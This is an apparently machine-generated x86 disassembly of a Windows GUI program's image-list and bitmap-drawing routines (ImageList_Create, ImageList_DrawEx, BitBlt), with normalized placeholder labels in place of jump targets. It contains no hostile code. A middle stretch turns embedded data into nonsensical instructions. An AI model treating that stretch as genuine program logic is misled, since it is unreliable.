cmp ax [ ebx + 0x84 ]
je r-xdata
pop edx
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x50 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
mov ax [ esp ]
mov [ ebx + 0x84 ] ax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x30 ]
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
mov dx [ esp ]
mov ecx [ eax ]
call [ ecx + 0x70 ]
mov eax [ ebx + 0x50 ]
mov eax [ eax + 0x4 ]
mov eax [ eax + edi * 4 ]
mov edx [ r-xdata ]
call sub_4033e4
test eax eax
je r-xdata
sub_443efc
push ebx
push esi
push edi
push ebp
mov ebx edx
mov ebp eax
cmp bl [ ebp + 0x86 ]
je r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax [ ebp + 0x50 ]
mov edi [ eax + 0x8 ]
dec edi
test edi edi
jl r-xdata
mov [ ebp + 0x86 ] bl
mov eax ebp
mov edx [ eax ]
call [ edx + 0x30 ]
inc edi
xor esi esi
inc esi
dec edi
jne r-xdata
mov edx esi
mov eax [ ebp + 0x50 ]
call sub_413840
mov edx ebx
mov ecx [ eax ]
call [ ecx + 0x74 ]
mov eax [ ebp + 0x50 ]
mov eax [ eax + 0x4 ]
mov eax [ eax + esi * 4 ]
mov edx [ r-xdata ]
call sub_4033e4
test eax eax
je r-xdata
sub_443f5c
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov eax [ esi + 0x8 ]
mov edx [ esi + 0x64 ]
call sub_404378
jne r-xdata
xor eax eax
jmp r-xdata
mov ebx [ esi + 0x4 ]
test ebx ebx
je r-xdata
mov ebx eax
mov edx edi
mov eax esi
call sub_419738
test bl bl
je r-xdata
mov al 0x1
test [ ebx + 0x1c ] 0x1
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax [ esi + 0x50 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov edx edi
mov eax esi
call sub_443b3c
sub_443fa8
push ebx
push ecx
mov [ esp ] 0x1
cmp [ eax + 0x8a ] 0x0
je r-xdata
mov al [ esp ]
pop edx
pop ebx
retn
mov ecx esp
mov ebx eax
mov eax [ ebx + 0x8c ]
call [ ebx + 0x88 ]
sub_443fd0
push ebx
mov ebx eax
xor eax eax
mov edx [ ebx + 0x5c ]
test edx edx
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x44 ]
cmp [ ebx + 0x6a ] 0x0
je r-xdata
cmp [ edx + 0x58 ] 0x0
jne r-xdata
cmp [ ebx + 0x6a ] 0x0
je r-xdata
cmp [ ebx + 0x95 ] 0x0
je r-xdata
pop ebx
retn
xor eax eax
jmp r-xdata
mov eax ebx
call sub_44345c
test al al
jne r-xdata
cmp [ ebx + 0x69 ] 0x0
je r-xdata
mov al 0x1
mov dl [ ebx + 0x69 ]
xor dl 0x1
mov eax ebx
call sub_443b9c
cmp [ ebx + 0x69 ] 0x0
je r-xdata
cmp [ ebx + 0x6c ] 0x0
jne r-xdata
sub_444064
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_414e88
mov edi eax
mov eax esi
call sub_446a88
movzx ecx ax
mov edx edi
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x24 ]
mov eax edi
pop edi
pop esi
pop ebx
retn
sub_444090
push ebx
push esi
push edi
push ebp
push ecx
mov ebp edx
mov edi eax
mov [ esp ] 0xffffffff
mov eax edi
mov edx [ eax ]
call [ edx + 0x14 ]
mov esi eax
dec esi
test esi esi
jl r-xdata
mov eax [ esp ]
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc esi
xor ebx ebx
inc ebx
dec esi
jne r-xdata
mov [ esp ] ebx
jmp r-xdata
mov edx ebx
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x18 ]
cmp bp ax
jne r-xdata
sub_4440d4
push ebp
mov ebp esp
xor eax eax
push ebp
push r-xdata
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_444100
retn
sub_444134
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
jl r-xdata
imul edx [ ecx + eax * 2 + 0xb010044 ] 0x54
dec ecx
insd
popad
dec ecx
outsb
js r-xdata
inc esp
add [ ecx + eax * 2 + 0x100044 ] al
add [ eax ] al
mov al [ 0x64004010 ]
xor al 0x40
add [ eax + 0x34 ] dh
inc eax
add [ esp + esi + 0x40 ] dh
add [ eax + 0x34 ] bh
inc eax
add [ esp + esi + 0x40 ] ch
add ah cl
xor [ eax ] eax
call 0xffffffff904481aa
push edi
inc esp
add [ ecx ] al
add bh bh
inc esp
push edi
inc esp
add [ ebx ] cl
push esp
inc ebx
push 0x65676e61
dec esp
imul ebp [ esi + 0x6b ] r-xdata
add [ ebx ] ecx
push esp
add [ eax ] al
add [ eax + 0x7fffffff ] al
mov eax eax
clc
inc ecx
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx + eax * 2 + 0x44 ] bl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx + eax * 2 ] bh
inc esp
add [ edx + eax * 2 + 0x44 ] al
add [ eax ] ch
add [ eax ] al
or al 0x21
inc ecx
add [ ecx + ebx * 4 + 0x41 ] ah
add [ eax + 0x34 ] dh
inc eax
add [ edx + edx * 4 + 0x34780041 ] ah
inc eax
add [ esp + esi + 0x40 ] ch
add ah cl
xor [ eax ] eax
call 0x10448226
inc ebx
inc esp
add [ eax + 0x4d ] ah
inc esp
add al ch
push eax
inc esp
add [ eax + 0x3000444c ] ah
xchg esi eax
inc ecx
add ah bh
xchg esp eax
inc ecx
add [ eax - 0x6a ] al
inc ecx
add [ eax ] bh
xchg edi eax
inc ecx
add [ ecx + ebx * 4 + 0x41 ] bh
add [ eax - 0x6a ] dl
inc ecx
add [ eax - 0x6a ] cl
inc ecx
add [ ecx + ebx * 4 + 0x42c40041 ] al
inc esp
add [ eax + ecx * 2 + 0x437c0044 ] dl
inc esp
add [ ebp + edx * 2 + 0x56280044 ] bl
inc esp
add [ eax + 0x100444e ] ah
add bh ch
push [ eax + 0x1000444e ]
push esp
inc ebx
jne r-xdata
mov eax 0x20000000
retn
je r-xdata
pop ds
retn
insd
dec ecx
insd
popad
dec esp
imul esi [ ebx + 0x74 ] 0x5c00408d
inc edx
inc esp
add [ edi ] al
adc [ ebx + eax * 2 + 0x75 ] dl
jae r-xdata
ror [ ebx + 0x4f01e8c6 ] cl
std
inc edi
inc esi
xor al 0x10
add [ eax ] al
add bh al
inc esi
xor [ eax ] dl
add [ eax ] al
add [ ebx - 0xef743a ] cl
push edx
xor al 0x8b
mov [ ebx + ebx * 8 - 0x6617f08c ] 0xf2
sti
jmp [ edi + ecx * 4 + 0x5 ]
outsd
insd
dec ecx
insd
popad
dec esp
imul esi [ ebx + 0x74 ] r-xdata
or [ edx ] ah
inc ecx
add [ edx ] al
add [ edi ] al
dec ecx
insd
dec esp
imul esi [ ebx + 0x74 ] 0xc08b0000
sub_4442c4
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_4191e0
mov [ esi + 0x34 ] 0x10
mov [ esi + 0x30 ] 0x10
mov eax esi
mov edx [ eax ]
call [ edx + 0x34 ]
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403540
mov eax esi
pop esi
pop ebx
retn
call sub_403598
pop [ fs : 0x0 ]
add esp 0xc
sub_444310
push ebx
push esi
push edi
call sub_4035a8
mov ebx edx
mov edi eax
jmp r-xdata
mov esi [ edi + 0x4c ]
cmp [ esi + 0x8 ] 0x0
jg r-xdata
mov eax esi
call sub_413928
mov edx eax
mov eax edi
call sub_444f00
mov eax [ edi + 0x50 ]
call sub_403234
mov eax edi
call sub_4445d4
mov eax [ edi + 0x4c ]
call sub_403234
xor eax eax
mov [ edi + 0x4c ] eax
mov eax [ edi + 0x54 ]
test eax eax
je r-xdata
mov edx ebx
and dl 0xfc
mov eax edi
call sub_41922c
test bl bl
jle r-xdata
call sub_403234
pop edi
pop esi
pop ebx
retn
mov eax edi
call sub_403590
sub_44437c
push ebp
mov ebp esp
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push r-xdata
push [ fs : eax ]
mov [ fs : eax ] esp
mov dl 0x1
mov eax [ r-xdata ]
call sub_403204
mov [ ebx + 0x4c ] eax
mov eax [ ebx + 0x30 ]
cmp eax 0x1
jl r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405a6c
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b2a0
call sub_4039a8
cmp eax 0x8000
jg r-xdata
cmp [ ebx + 0x34 ] 0x1
jge r-xdata
mov [ ebx + 0x38 ] 0x4
mov [ ebx + 0x41 ] 0x1
mov dl 0x2
mov eax ebx
call sub_444e88
mov [ ebx + 0x43 ] 0x0
mov [ ebx + 0x44 ] 0x1fffffff
mov [ ebx + 0x48 ] 0x1fffffff
mov dl 0x1
mov eax [ r-xdata ]
call sub_41f8b4
mov [ ebx + 0x50 ] eax
mov eax ebx
call sub_444448
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_444430
lea eax [ ebp - 0x4 ]
call sub_403f6c
retn
sub_444448
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
mov [ ebp - 0x4 ] eax
push 0x0
call GetDC
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push r-xdata
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x50 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x34 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
call CreateCompatibleBitmap
mov edx eax
mov eax ebx
call sub_42099c
mov eax ebx
call sub_41fe7c
mov eax [ eax + 0x14 ]
xor edx edx
call sub_41ca04
mov eax ebx
mov edx [ eax ]
call [ edx + 0x20 ]
push eax
lea eax [ ebp - 0x18 ]
push eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x2c ]
mov ecx eax
xor edx edx
xor eax eax
call sub_41240c
lea eax [ ebp - 0x18 ]
push eax
mov eax ebx
call sub_41fe7c
pop edx
call sub_41cda8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4444f0
mov eax [ ebp - 0x8 ]
push eax
push 0x0
call ReleaseDC
retn
sub_44450c
push ebx
add esp 0xfffffff8
mov ebx eax
mov eax [ ebx + 0x34 ]
mov [ esp + 0x4 ] eax
mov eax [ ebx + 0x30 ]
mov [ esp ] eax
push esp
lea eax [ esp + 0x8 ]
push eax
push edx
call ImageList_GetIconSize
mov eax [ esp + 0x4 ]
mov [ ebx + 0x34 ] eax
mov eax [ esp ]
mov [ ebx + 0x30 ] eax
mov eax ebx
call sub_444448
pop ecx
pop edx
pop ebx
retn
sub_444544
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_4445d4
test esi esi
je r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
call sub_44450c
mov [ ebx + 0x3c ] esi
mov eax ebx
mov si 0xffef
call sub_403430
sub_444580
push ebx
push esi
push edi
mov edi ecx
mov ebx edx
mov esi eax
mov edx ebx
mov eax esi
call sub_444e10
test ebx ebx
je r-xdata
mov eax [ esi + 0x50 ]
mov edx [ eax ]
call [ edx + 0x64 ]
mov eax ebx
call sub_41fee8
cmp al 0x1
jne r-xdata
mov edx ebx
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x8 ]
mov dl 0x1
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x6c ]
mov eax edi
mov edx [ eax ]
call [ edx + 0x64 ]
jmp r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x64 ]
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_4445d4
push ebx
push esi
mov ebx eax
mov eax ebx
call sub_444434
test al al
je r-xdata
xor eax eax
mov [ ebx + 0x3c ] eax
mov eax ebx
mov si 0xffef
call sub_403430
pop esi
pop ebx
retn
cmp [ ebx + 0x42 ] 0x0
jne r-xdata
mov eax ebx
call sub_444570
push eax
call ImageList_Destroy
sub_44460c
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov ebx eax
xor eax eax
push ebp
push r-xdata
push [ fs : eax ]
mov [ fs : eax ] esp
mov esi [ ebx + 0x38 ]
push esi
push esi
xor eax eax
mov al [ ebx + 0x41 ]
mov eax [ eax * 4 + rw-data ]
or eax 0xfe
push eax
mov eax [ ebx + 0x30 ]
push eax
mov eax [ ebx + 0x34 ]
push eax
call ImageList_Create
mov [ ebx + 0x3c ] eax
mov eax ebx
call sub_444434
test al al
jne r-xdata
mov eax [ ebx + 0x44 ]
cmp eax 0x1fffffff
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405a6c
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b2a0
call sub_4039a8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4446a6
lea eax [ ebp - 0x4 ]
call sub_403f6c
retn
mov edx eax
mov eax ebx
call sub_444834
sub_4446ac
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
mov esi ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_41f8b4
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push r-xdata
push [ fs : eax ]
mov [ fs : eax ] esp
mov dl 0x1
mov eax [ r-xdata ]
call sub_41f8b4
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push r-xdata
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_44443c
mov ecx [ ebp - 0x10 ]
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_444580
push eax
mov ecx [ ebp - 0xc ]
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_444580
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x3c ]
push eax
call ImageList_Add
mov [ ebp - 0x8 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_444745
mov eax [ ebp - 0x10 ]
call sub_403234
retn
sub_444778
push ebx
mov ebx eax
mov eax ebx
call sub_444434
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax ebx
call sub_444570
push eax
call ImageList_GetImageCount
pop ebx
retn
sub_44479c
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push r-xdata
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_444778
cmp esi eax
jl r-xdata
mov eax ebx
call sub_444434
test al al
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405a6c
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b2a0
call sub_4039a8
mov eax ebx
mov si 0xffef
call sub_403430
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_444822
lea eax [ ebp - 0x4 ]
call sub_403f6c
retn
push esi
mov eax ebx
call sub_444570
push eax
call ImageList_Remove
sub_444834
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_444434
test al al
je r-xdata
mov [ ebx + 0x44 ] esi
mov eax esi
call sub_444284
push eax
mov eax [ ebx + 0x3c ]
push eax
call ImageList_SetBkColor
jmp r-xdata
mov eax ebx
mov si 0xffef
call sub_403430
pop esi
pop ebx
retn
sub_44486c
push ebx
mov ebx eax
mov eax ebx
call sub_444434
test al al
je r-xdata
mov eax [ ebx + 0x44 ]
pop ebx
retn
mov eax ebx
call sub_444570
push eax
call ImageList_GetBkColor
call sub_4442a4
pop ebx
retn
sub_444894
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
push esi
push edi
mov edi ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov eax ebx
call sub_444434
test al al
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x10
cmp [ ebp + 0x8 ] 0x0
je r-xdata
cmp [ ebx + 0x54 ] 0x0
jne r-xdata
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebx + 0x48 ]
call sub_444284
push eax
mov eax ebx
call sub_44486c
call sub_444284
push eax
push 0x0
push 0x0
mov eax [ ebp + 0x10 ]
push eax
mov eax [ ebp + 0x14 ]
push eax
mov eax edi
call sub_41d1bc
push eax
mov eax [ ebp - 0x4 ]
push eax
mov eax ebx
call sub_444570
push eax
call ImageList_DrawEx
jmp r-xdata
mov eax [ ebx + 0x54 ]
call sub_41fe7c
mov eax [ eax + 0x14 ]
mov edx 0xffffff
call sub_41ca04
mov eax [ ebx + 0x30 ]
push eax
lea eax [ ebp - 0x28 ]
push eax
mov ecx [ ebx + 0x34 ]
xor edx edx
xor eax eax
call sub_41240c
lea eax [ ebp - 0x28 ]
push eax
mov eax [ ebx + 0x54 ]
call sub_41fe7c
pop edx
call sub_41cda8
push 0x0
push 0x0
push 0xffffffff
push 0x0
push 0x0
push 0x0
push 0x0
mov eax [ ebx + 0x54 ]
call sub_41fe7c
call sub_41d1bc
push eax
mov eax [ ebp - 0x4 ]
push eax
mov eax ebx
call sub_444570
push eax
call ImageList_DrawEx
mov eax [ ebp + 0x10 ]
add eax [ ebx + 0x30 ]
push eax
lea eax [ ebp - 0x18 ]
push eax
mov ecx [ ebp + 0x14 ]
add ecx [ ebx + 0x34 ]
mov edx [ ebp + 0x10 ]
mov eax [ ebp + 0x14 ]
call sub_41240c
mov eax [ ebx + 0x54 ]
call sub_41fe7c
call sub_41d1bc
mov [ ebp - 0x8 ] eax
mov eax [ edi + 0x14 ]
mov edx 0xff000014
call sub_41ca04
mov eax edi
call sub_41d1bc
mov esi eax
push 0xffffff
push esi
call SetTextColor
push 0x0
push esi
call SetBkColor
push 0xe20746
push 0x0
push 0x0
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebx + 0x30 ]
push eax
mov eax [ ebx + 0x34 ]
push eax
mov eax [ ebp + 0x10 ]
inc eax
push eax
mov eax [ ebp + 0x14 ]
inc eax
push eax
push esi
call BitBlt
mov eax [ edi + 0x14 ]
mov edx 0xff000010
call sub_41ca04
mov eax edi
call sub_41d1bc
mov esi eax
push 0xffffff
push esi
call SetTextColor
push 0x0
push esi
call SetBkColor
push 0xe20746
push 0x0
push 0x0
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebx + 0x30 ]
push eax
mov eax [ ebx + 0x34 ]
push eax
mov eax [ ebp + 0x10 ]
push eax
mov eax [ ebp + 0x14 ]
push eax
push esi
call BitBlt
mov dl 0x1
mov eax [ r-xdata ]
call sub_41f8b4
mov esi eax
mov [ ebx + 0x54 ] esi
mov dl 0x1
mov eax esi
call sub_420bec
mov edx [ ebx + 0x34 ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x40 ]
mov edx [ ebx + 0x30 ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x34 ]
sub_444a68
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x10 ]
push ebx
mov ebx [ ebp + 0xc ]
push ebx
mov bl [ eax + 0x40 ]
push ebx
mov bl [ eax + 0x43 ]
push ebx
mov bl [ ebp + 0x8 ]
push ebx
call sub_444a8c
pop ebx
pop ebp
retn 0xc
sub_444a8c
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax ebx
call sub_444434
test al al
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0x14
push edi
mov eax [ ebp + 0x18 ]
push eax
xor eax eax
mov al [ ebp + 0x10 ]
mov eax [ eax * 4 + rw-data ]
xor edx edx
mov dl [ ebp + 0xc ]
or eax [ edx * 4 + rw-data ]
push eax
mov al [ ebp + 0x8 ]
push eax
mov ecx esi
mov edx [ ebp + 0x14 ]
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x30 ]
sub_444ad8
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
push esi
push edi
mov edi ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
lea eax [ ebp - 0x28 ]
push eax
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x34 ]
xor edx edx
xor eax eax
call sub_41240c
mov eax [ ebp - 0x4 ]
call sub_44576c
xor eax eax
push ebp
push r-xdata
push [ fs : eax ]
mov [ fs : eax ] esp
mov dl 0x1
mov eax [ r-xdata ]
call sub_41f8b4
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push r-xdata
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x30 ]
mov eax [ ebp - 0xc ]
mov ecx [ eax ]
call [ ecx + 0x34 ]
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x34 ]
mov eax [ ebp - 0xc ]
mov ecx [ eax ]
call [ ecx + 0x40 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_41f8b4
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push r-xdata
push [ fs : eax ]
mov [ fs : eax ] esp
mov dl 0x1
mov eax [ ebp - 0x10 ]
call sub_420bec
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x30 ]
mov eax [ ebp - 0x10 ]
mov ecx [ eax ]
call [ ecx + 0x34 ]
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x34 ]
mov eax [ ebp - 0x10 ]
mov ecx [ eax ]
call [ ecx + 0x40 ]
mov eax [ ebp - 0x8 ]
push eax
call ImageList_GetImageCount
mov esi eax
dec esi
test esi esi
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_444c3e
mov eax [ ebp - 0x10 ]
call sub_403234
retn
inc esi
xor ebx ebx
mov eax [ ebp - 0xc ]
call sub_41fe7c
mov [ ebp - 0x14 ] eax
lea edx [ ebp - 0x28 ]
mov eax [ ebp - 0x14 ]
call sub_41cda8
push 0x0
push 0x0
push 0x0
mov eax [ ebp - 0x14 ]
call sub_41d1bc
push eax
push ebx
mov eax [ ebp - 0x8 ]
push eax
call ImageList_Draw
mov eax [ ebp - 0x10 ]
call sub_41fe7c
mov [ ebp - 0x18 ] eax
lea edx [ ebp - 0x28 ]
mov eax [ ebp - 0x18 ]
call sub_41cda8
push 0x10
push 0x0
push 0x0
mov eax [ ebp - 0x18 ]
call sub_41d1bc
push eax
push ebx
mov eax [ ebp - 0x8 ]
push eax
call ImageList_Draw
mov ecx [ ebp - 0x10 ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_4446ac
cmp ebx edi
jne r-xdata
cmp edi 0xffffffff
je r-xdata
inc ebx
dec esi
jne r-xdata
sub_444c80
push ebx
push esi
mov esi edx
mov ebx eax
test esi esi
je r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_444570
mov edx eax
or ecx 0xffffffff
mov eax ebx
call sub_444ad8
sub_444ca0
push ebx
push esi
mov esi edx
mov ebx eax
test esi esi
jne r-xdata
mov eax esi
mov edx [ r-xdata ]
call sub_4033c0
test al al
je r-xdata
mov eax ebx
call sub_4445d4
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
call sub_413de4
mov eax ebx
call sub_444828
mov al [ esi + 0x41 ]
mov [ ebx + 0x41 ] al
mov al [ esi + 0x43 ]
mov [ ebx + 0x43 ] al
mov dl [ esi + 0x40 ]
mov eax ebx
call sub_444e88
mov al [ esi + 0x42 ]
mov [ ebx + 0x42 ] al
mov eax esi
call sub_444570
mov edx eax
mov eax ebx
call sub_44450c
mov eax ebx
call sub_444434
test al al
jne r-xdata
mov eax [ ebx + 0x30 ]
push eax
mov eax [ ebx + 0x34 ]
push eax
mov eax ebx
call sub_444570
push eax
call ImageList_SetIconSize
mov eax ebx
call sub_44443c
jmp r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_444570
push eax
call ImageList_GetBkColor
call sub_4442a4
mov edx eax
mov eax ebx
call sub_444834
mov eax [ esi + 0x48 ]
mov [ ebx + 0x48 ] eax
mov edx esi
mov eax ebx
call sub_444c80
jmp r-xdata
sub_444d60
push ebx
push esi
mov ebx edx
mov esi eax
mov eax ebx
mov edx [ r-xdata ]
call sub_4033c0
test al al
je r-xdata
mov edx ebx
mov eax esi
call sub_413ec8
pop esi
pop ebx
retn
mov al [ esi + 0x41 ]
mov [ ebx + 0x41 ] al
mov al [ esi + 0x43 ]
mov [ ebx + 0x43 ] al
mov dl [ esi + 0x40 ]
mov eax ebx
call sub_444e88
mov al [ esi + 0x42 ]
mov [ ebx + 0x42 ] al
mov eax [ esi + 0x48 ]
mov [ ebx + 0x48 ] eax
mov eax ebx
call sub_444828
mov eax esi
call sub_444570
mov edx eax
mov eax ebx
call sub_44450c
mov eax ebx
call sub_444434
test al al
jne r-xdata
mov eax [ ebx + 0x30 ]
push eax
mov eax [ ebx + 0x34 ]
push eax
mov eax ebx
call sub_444570
push eax
call ImageList_SetIconSize
mov eax ebx
call sub_44443c
jmp r-xdata
mov eax esi
call sub_444570
push eax
call ImageList_GetBkColor
call sub_4442a4
mov edx eax
mov eax ebx
call sub_444834
mov edx esi
mov eax ebx
call sub_444c80
pop esi
pop ebx
retn
sub_444e10
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push r-xdata
push [ fs : eax ]
mov [ fs : eax ] esp
test esi esi
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_444e83
lea eax [ ebp - 0x4 ]
call sub_403f6c
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x20 ]
cmp eax [ ebx + 0x30 ]
jl r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405a6c
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b2a0
call sub_4039a8
mov eax esi
mov edx [ eax ]
call [ edx + 0x2c ]
cmp eax [ ebx + 0x34 ]
jge r-xdata
sub_444eb0
push ebx
push esi
push edi
push ebp
mov ebx eax
mov [ ebx + 0x58 ] 0x1
cmp [ ebx + 0x5c ] 0x0
jg r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x4c ]
test eax eax
je r-xdata
cmp [ ebx + 0x62 ] 0x0
je r-xdata
mov edi [ eax + 0x8 ]
dec edi
test edi edi
jl r-xdata
mov edx ebx
mov eax [ ebx + 0x64 ]
call [ ebx + 0x60 ]
inc edi
xor ebp ebp
mov edx ebp
mov eax [ ebx + 0x4c ]
call sub_413840
mov si 0xffff
call sub_403430
inc ebp
dec edi
jne r-xdata
sub_444f00
push ebx
push esi
push edi
push ebp
mov ebp edx
mov ebx eax
mov eax [ ebx + 0x4c ]
test eax eax
je r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov edi [ eax + 0x8 ]
dec edi
test edi edi
jl r-xdata
inc edi
xor esi esi
inc esi
dec edi
jne r-xdata
xor eax eax
mov [ ebp + 0x4 ] eax
mov edx esi
mov eax [ ebx + 0x4c ]
call sub_413730
jmp r-xdata
mov edx esi
mov eax [ ebx + 0x4c ]
call sub_413840
cmp ebp eax
jne r-xdata
sub_444f58
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx ]
push edx
push eax
mov eax esi
mov edx [ eax ]
call [ edx ]
cmp edx [ esp + 0x4 ]
jne r-xdata
pop edx
pop eax
jne r-xdata
cmp eax [ esp ]
xor eax eax
pop esi
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx ]
mov ecx eax
mov edx [ esi + 0x4 ]
mov eax [ ebx + 0x4 ]
call sub_407ad4
test al al
jne r-xdata
mov al 0x1
pop esi
pop ebx
retn
sub_444f9c
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov edi edx
mov esi eax
test edi edi
je r-xdata
mov [ ebp - 0x1 ] 0x0
jmp r-xdata
mov eax esi
call sub_444778
mov ebx eax
mov eax edi
call sub_444778
cmp ebx eax
je r-xdata
mov al [ ebp - 0x1 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax esi
call sub_444778
test eax eax
jne r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_403204
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push r-xdata
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x8 ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x3c ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_403204
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push r-xdata
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0xc ]
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x3c ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_444f58
mov [ ebp - 0x1 ] al
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_445062
mov eax [ ebp - 0xc ]
call sub_403234
retn
mov eax edi
call sub_444778
test eax eax
jne r-xdata
mov [ ebp - 0x1 ] 0x1
jmp r-xdata
